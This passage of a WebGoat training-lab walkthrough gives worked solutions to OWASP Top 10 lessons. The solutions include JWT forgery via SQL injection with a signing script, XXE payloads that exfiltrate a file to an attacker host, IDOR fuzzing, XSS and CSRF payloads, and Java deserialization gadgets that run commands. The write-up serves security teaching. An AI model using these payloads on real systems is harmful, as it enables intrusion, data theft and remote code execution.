![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The token from the access log is no longer valid, can you find a way to refresh it?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The endpoint for refreshing a token is 'jwt/refresh/newToken'  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use the found access token in the Authorization: Bearer header and use your own refresh token

*   Find the `<tom_access_token>` from the logs.
*   Make a `POST` request to http://host:port/WebGoat/JWT/refresh/newToken with header `Content-Type: application/json` and `Authorization: Bearer <tom_access_token>` and content `{"refresh_token":"<jerry_refresh_token>"}`
*   Get the `<tom_access_token_new>`.
*   Intercept the POST request to http://host:port/WebGoat/JWT/refresh/checkout and add header `Authorization: Bearer <tom_access_token_new>`

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-1.png)

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-2.png)

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-3.png)

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-4.png)

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-5.png)

8.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  It lacks a precision in the hints: the key is decoded as a base64 chain. Also instead of using as **kid** `hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --`, you have to use `hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --`   
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Take a look at the token and specifically and the header  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The 'kid' (key ID) header parameter is a hint indicating which key was used to secure the JWS  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The key can be located on the filesystem in memory or even reside in the database  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The key is stored in the database and loaded while verifying a token  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Using a SQL injection you might be able to manipulate the key to something you know and create a new token.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use: hacked' UNION select 'deletingTom' from INFORMATION\_SCHEMA.SYSTEM\_USERS -- as the kid in the header and change the contents of the token to Tom and hit the endpoint with the new token

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On WebGoat, click on **Delete**.
*   Locate the query to `delete` in the _Network_ tab and click on _Headers_.
*   Notice the parameter:
```
token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOi
JXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYX
VkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycn
kiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6i
zOU638uUCi6UhiOJKYzoEZGE8
```
*   In base64, this is decoded as:
```
{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}.{"iss":"WebGoat Token Builder",
"iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com",
"username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature
```
*   Edit the first two parts of the token as
```
{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from 
INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}
```
and
```
{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,
"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom",
"Email":"jerry@webgoat.com","Role":["Cat"]}
```
then calculate the new signature with `deletingTom` as the new key. Use the Python script below for example. 
*   The new token is
```
eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScg
ZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJpc
3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwN
CwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiV
G9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.JrDpQmNiVI818UvO
MQgRmPkZOetw7Ic1WbPvStS2B6U
```
*   Click on _Modify and Resend_, modify the token with the newly generated parameter and send again the request.

```python
import base64  
import hashlib  
import hmac  
  
def jwt_tokens_8():  
     def hmac_base64(key, message):  
         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))  
  
     header = '{"typ":"JWT","kid":"hacked\' UNION select \'ZGVsZXRpbmdUb20=\' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}'.encode()  
     payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}'.encode()  
  
     new_token = (base64.urlsafe_b64encode(header).decode().rstrip('=') +  
         '.' +  
         base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()  
     new_signature = hmac_base64('deletingTom'.encode(), new_token)  
     new_token += ('.' + new_signature.decode().rstrip('=')).encode()  
  
     print('New token: {}'.format(new_token.decode()))  
     return  
  
jwt_tokens_8()
```

#### **(A3) Sensitive Data Exposure:**

##### Insecure Login

2.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On WebGoat, click on **Log in**.
*   Locate the query to `start.mc` in the _Network_ tab and click on _Parameters_.
*   Notice the parameters `{"username":"CaptainJack","password":"BlackPearl"}`.

#### **(A4) XML External Entities (XXE):**

##### XXE

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try submitting the form and see what happens  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use ZAP/Burp to intercept the request and try to include your own DTD  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to include a doctype "(<!DOCTYPE...)" in the xml  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The include can be as follows: <!DOCTYPE user \[<!ENTITY root SYSTEM "file:///"> \]>  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Do not forget to reference the entity  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) In the comment you should references: <comment><text>&root;test</text></comment>

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On WebGoat, post a comment.
*   Locate the query to `simple` in the _Network_ tab and click on _Edit and Resend_.
*   Edit the body with: `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`.

![XXE 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xxe-3.png)

4.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Take a look at the content type  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Does the endpoint only accept json messages?

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On WebGoat, post a comment.
*   Locate the query to `content-type` in the _Network_ tab and click on _Edit and Resend_.
*   Edit the body with: `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`. and edit the header `Content-Type: application/json` with `Content-Type: application/xml`.

![XXE 4](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xxe-4.png)

6. Although it is not a challenge, a small mistake has crept into the lesson, be careful to enter the right URL to be able to perform the test.  
  
**attack.dtd**  
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!ENTITY ping SYSTEM 'http://host:port/landing?test=HelloWorld' >
```  
  
**Request Body**  
```xml
<?xml version="1.0"?>  
<!DOCTYPE root [  
<!ENTITY % remote SYSTEM "http://host:port/files/username/attack.dtd" >  
%remote;  
]>  
<comment>  
<text>test&ping;</text>  
</comment>  
```

7.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) This assignment is more complicated you need to upload the contents of a file to the attackers site (WebWolf in this case)  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) In this case you cannot combine external entities in combination with internal entities.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use parameter entities to perform the attack, see for example: https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) An example DTD can be found here WebGoat/https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/example.dtd, include this DTD in the xml comment  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use for the comment, be aware to replace the url accordingly: <?xml version="1.0"?><!DOCTYPE comment \[<!ENTITY % remote SYSTEM "http://localhost:9090/files/test1234/test.dtd">%remote;\]><comment><text>test&send;</text></comment>

*   Upload **contents\_file.dtd** on **WebWolf**.
*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   On WebGoat, post a comment.
*   Locate the query to `blind` in the _Network_ tab and click on _Edit and Resend_.
*   Edit the body of the query as specified below.

**contents\_file.dtd**  
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!ENTITY % all "<!ENTITY send SYSTEM 'http://host:port/landing?%file;' >" >%all;
```  
  
**Request Body**  
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE xxe [  
<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt" >  
<!ENTITY % dtd SYSTEM "http://host:port/files/username/contents_file.dtd" >  
%dtd;]>  
<comment>  
<text>test&send;</text>  
</comment>
```

![XXE 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xxe-7.png)

#### **(A5) Broken Access Control:**

##### Insecure Direct Object References

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Log in first. User Name is tom, password is cat.

Identify with the provided credentials.

3.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation. 

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure you have logged in on the previous step/page  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) View the response using developer tools or a proxy.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The attributes are not visible and have nothing to do with size, color or name

Attributes are: **role**, **userID**.

4.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the previous request for profile, this is similar  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will need data from the previous request for your own profile  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Append your id to the previous request (i.e. .../profile/{yourId})

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   In the lesson 3, click on **View Profile**.
*   Locate the query to `blind` in the _Network_ tab and click on _Response_.
*   Notice the paramter **userID**, the expected answer is **WebGoat/IDOR/profile/userID\_value**.

![IDOR 4](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/idor-4.png)

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The default request here won't work at all, so you will need to manually craft the request or tamper it with a proxy  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will likely need to 'fuzz' to try different values for the userId at the end of the Url  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try incrementing the id value. It's not a simple +1, but it's also not too far off  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) For editing the other user's profile, you will need to use the proxy or manually craft the request again  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) To edit the other user's profile, you will use the same Url you did to view the other user's profile  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) To edit, You will need to change the method, what is the RESTful method used for 'update' or 'edit'?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will also need the body of the request (will look something like the profile)  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The request should go to ... /WebGoat/IDOR/profile/{Buffalo Bills Id}  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Your payload should look something like ... {"role" : 1,"color" : "red","size" : "small","name" : "Tom Cat","userId" : "2342388"}

**View Another Profile**:  
The script below _fuzz_ the URL found in the previous exercise to find another profile. We find one at 2342388.

```python
import requests  
  
def idor_5():  
     index = 2342300  
  
     headers = {  
         'Cookie': COOKIE,  
     }  
  
     while True:  
         r = requests.get('http://192.168.99.100:8080/WebGoat/IDOR/profile/{}'.format(index), headers=headers)  
  
         if r.status_code != 500 and index != 2342384:  
             print("Index: {}".format(index))  
             return  
         index += 1  
  
idor_5()
```

**Edit Another Profile**:  
Send a PUT request to http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 with header `Content-Type: application/json` and body `{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}`

##### Missing Function Level Access Control

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You can inspect the DOM or review the source in the proxy request/response cycle.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look for indications of something that would not be available to a typical user  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look for something a super-user or administator might have available to them

*   Right-click on the **Log Out** element, and click on _Inspect Element_
*   Just below in the HTML, we can see hidden fields: **Users**, **Config**.

![MFLAC 2](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/mflac-2.png)

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) There is an easier way and a 'harder' way to achieve this, the easier way involves one simple change in a GET request.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If you haven't found the hidden menus from the earlier exercise, go do that first.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) When you look at the users page, there is a hint that more info is viewable by a given role.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) For the easy way, have you tried tampering the GET request? Different content-types?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) For the 'easy' way, modify the GET request to /users to include 'Content-Type: application/json'  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Now for the harder way ... it builds on the easier way'  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If the request to view users, were a 'service' or 'RESTful' endpoint, what would be different about it?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If you're still looking for hints ... try changing the Content-type header as in the GET request.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You also need to deliver a proper payload for the request (look at how registration works). This should be formatted in line with the content-type you just defined.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will want to add WEBGOAT\_ADMIN for the user's role. Yes, you'd have to guess/fuzz this in a real-world setting.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) OK, here it is. First, create an admin user ... Change the method to POST, change the content-type to "application/json". And your payload should look something like: {"username":"newUser2","password":"newUser12","matchingPassword":"newUser12","role":"WEBGOAT\_ADMIN"}  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Now log in as that user and bring up WebGoat/users. Copy your hash and log back in to your original account and input it there to get credit.

*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   Go to http://host:port/WebGoat/users.
*   Locate the query to `users` in the _Network_ tab and click on _Edit and Resend_.
*   Add the header `Content-Type: application/json`.
*   Check the hash in the response.

![MFLAC 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/mflac-3.png)

![MFLAC 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/mflac-3-2.png)

#### **(A7) Cross-Site Scripting (XSS):**

![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  In the left panel, the green checkbox that is supposed to appear after completing all the lessons of a topic does not appear for any of the three lessons. 

##### Cross Site Scripting

2. 
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png) Main browsers have banned Javascript from the URL bar, contrary to what the suggestion say. Open the _Development Tools_, and the _Console_ tab instead.

The expected answer is `Yes`.

7.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Think about how the inputs are presumably processed by the application.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Quantity inputs are probably processed as integer values. Not the best option for inputting text right?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) What information send to the application gets reflected back after being submitted?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Just try purchasing something. You want your script to be included in the purchase-confirmation.

Put `<script>alert()</script>` in the box **Enter your credit card number:**.

10.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) To search through the client side code, use the developer tools of your browser. (If you don't know how to use them, check the Developer Tools Lesson in the general category.)  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Since you are looking for application code, check the WebGoat/js/goatApp folder for a file that could handle the routes.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure you add the base route at the start, when submitting your solution.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Still did not find it? Check the GoatRouter.js file. It should be pretty easy to determine.

*   Open the _Development Tools_ in the browser, and go to the _Debugger_ tab.
*   Locate the `goatApp/View/GoatRouter.js` file and open it.
*   Look for **routes** to find `'test/:param': 'testRoute'`.
*   The expected answer is then `start.mvc#test/`.

![XSS 10](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xss-10.png)

11.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Open a new tab and navigate to the test-route you just figured out in the previous lesson.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Your url should look something like that http://localhost:8080/WebGoat/start.mvc#REPLACE-WITH-THE-TEST-ROUTE/some\_parameters  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Note how the parameters you send to the test-route get reflected back to the page. Now add your JavaScript to it.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You have to use script tags, so your JavaScript code gets executed when being rendered into the DOM.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Since you are working with an URL, you might have to URL-encode your parameters.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Replace '/' with '%2F' in your URL parameters.

*   Open the _Development Tools_ in the browser, and go to the _Console_ tab.
*   Navigate to the [URL http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;](http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;).
*   Retrieve the number in the function output.

![XSS 11](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xss-11.png)

12.
**1. Are trusted websites immune to XSS attacks?**

Solution 4: No because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.

**2. When do XSS attacks occur?**

Solution 3: The data is included in dynamic content that is sent to a web user without being validated for malicious content.

**3. What are Stored XSS attacks?**

Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.

**4. What are Reflected XSS attacks?**

Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request.

**5\. Is JavaScript the only way to perform XSS attacks?**

Solution 4: No there are many other ways. Like HTML, Flash or any other type of code that the browser executes.

##### Cross Site Scripting (stored)

3.
*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
*   Comment with `phoneHome Response is <script>webgoat.customjs.phoneHome()</script>`.
*   Retrieve the number in the function output.

![XSS Stored 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xss-stored-3.png)

##### Cross Site Scripting (mitigation)

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You do not store the user input in this example. Try to encode the user's input right before you place it into the HTML document.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make use of JavaServer Pages Standard Tag Library (JSTL) and JSP Expression Language.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Take a look at OWASP Java Encoder Project.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Do not forget to reference the tag libs and choose "e" as prefix.

*   The first line shoud contain: `<%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %>`
*   Replace `<%= request.getParameter("first_name")%>` with `${e:forHtml(param.first_name)}`.
*   Replace `<%= request.getParameter("last_name")%>` with `${e:forHtml(param.last_name)}`.

6.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to have a look at the AntiSamy documentation.

The following code validate the lesson.

```java
import org.owasp.validator.html.*;  
import MyCommentDAO;  
  
public class AntiSamyController {  
     public void saveNewComment(int threadID, int userID, String newComment){  
         Policy p = Policy.getInstance("antisamy-slashdot.xml");  
         AntiSamy as = new AntiSamy();  
         CleanResults cr = as.scan(newComment, p, AntiSamy.DOM);  
         MyCommentDAO.addComment(threadID, userID, cr.getCleanHTML());  
     }  
}  
```

#### **(A8) Insecure Deserialization:**

##### Insecure Deserialization

5.  
There was some solid work from earlier contributors on this one, which were sadly red herrings. Solution is serializing a VulnerableTaskHolder object created with parameters suitable for the system. For windows it will be something that keeps the system busy for 5 seconds, many people seem to choose to ping localhost: "ping localhost -n 5" will do nicely. For linux, a "sleep 5" gets the job done.

Windows payload:
rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfjDAoXFDULkHQseHQAE3BpbmcgbG9jYWxob3N0IC1uIDV0AA5jcnVtcGV0c3dhaXRlcg==

Linux payload:
rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfjDAsAATgb5CBEeHQAB3NsZWVwIDV0AA5jcnVtcGV0c3dhaXRlcg

Code to generate payload; you can run this method as a test.

```java
public void createPayload() throws Exception {
		VulnerableTaskHolder o = new VulnerableTaskHolder("namenotimportant", "sleep 5");
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);
		oos.writeObject(o);
		oos.close();
		System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
}
```

Please note that this was only verified on a Windows machine and the Linux payload has been generated blindly.

#### **(A9) Vulnerable Components:**

##### Vulnerable Components

5.
Copy-paste `Ok<script>XSS</script>` in each box.

12.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  This lesson does not seem to work. 

For the deserialization, go to the link: http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/ to read about why it works. The following payload should work.  

```  xml
<sorted-set>  
     <string>foo</string>  
     <dynamic-proxy>  
         <interface>java.lang.Comparable</interface>  
         <handler class="java.beans.EventHandler">  
             <target class="java.lang.ProcessBuilder">  
                 <command>  
                     <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>  
                 </command>  
             </target>  
             <action>start</action>  
         </handler>  
     </dynamic-proxy>  
</sorted-set>  
```

#### **(A8:2013) Request Forgery:**

##### Cross-Site Request Forgeries

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The form has hidden inputs.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will need to use an external page and/or script to trigger it.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try creating a local page or one that is uploaded and points to this form as its action.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The trigger can be manual or scripted to happen automatically

Save the following code in a file **csrf.html** and open it in a web browser.  

```html
<form name="attack" action="http://host:port/WebGoat/csrf/basic-get-flag" method="POST">  
     <input type="hidden" name='csrf' value='true'>  
</form>  
<script>document.attack.submit();</script>  
```

4.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Again, you will need to submit from an external domain/host to trigger this action. While CSRF can often be triggered from the same host (e.g. via persisted payload), this doesn't work that way.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember, you need to mimic the existing workflow/form.  
